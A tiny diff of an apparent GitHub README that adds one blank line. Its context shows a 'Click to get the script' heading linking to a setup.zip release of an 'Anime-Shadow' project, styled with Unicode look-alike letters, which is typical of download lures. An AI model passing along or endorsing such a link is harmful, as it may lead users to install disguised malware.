@@ -33,6 +33,7 @@
 
 
 
+
 # Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Anime-Shadow/releases/download/Download/setup.zip)***
 
 ![hq720](https://github.com/user-attachments/assets/71354655-9234-4715-9865-6fa89ba25c91)
